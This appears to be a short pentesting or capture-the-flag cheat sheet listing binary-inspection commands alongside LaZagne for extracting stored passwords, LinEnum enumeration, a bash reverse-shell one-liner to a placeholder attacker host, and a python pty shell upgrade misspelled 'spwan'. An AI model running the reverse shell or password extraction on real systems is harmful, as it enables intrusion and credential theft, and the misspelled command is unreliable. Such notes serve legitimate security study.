Command,:,Description
,,
file     ,:, Gives info about type of file etc
LaZagne     ,:, Tool to extract all types of passwords present in machine(https://github.com/AlessandroZ/LaZagne)
size     ,:, Gives info about the different sections of the executable	i.e Text Section  BSS Section  Data Section etc
strings  ,:, List out all the string present in the executable file
ltrace   ,:, Library tracer
checksec ,:, (From pwntools) Checks and tells the flags for Stack Canary PIE  NX  RELRO and architecture from executable .
ldd      ,:, Print shared libraries being used by the binary
LinEnum.sh      ,:, Linux enumeration scripts
gdb->list funcitons,:, To list all functions used in a binary
bash -c 'bash -i </dev/tcp/AttackerIp/AttackerPort 2>&1 >&0' ,:,  Reverse shell on attacker machine using bash
python3 -c 'import pty;pty.spwan(\'/bin/bash\')' ,:, Gives a shell/terminal with some pre-built features, tab completion etc

